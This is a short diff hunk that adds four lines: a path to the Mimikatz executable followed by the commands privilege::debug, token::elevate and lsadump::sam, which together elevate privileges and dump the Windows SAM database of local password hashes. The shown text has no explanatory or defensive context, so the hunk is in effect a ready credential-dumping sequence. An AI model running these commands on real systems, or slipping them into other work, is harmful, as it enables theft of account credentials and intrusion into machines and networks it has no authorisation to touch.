@@ -1,0 +1,4 @@
+C:\tools\Mimikatz\x64\Mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
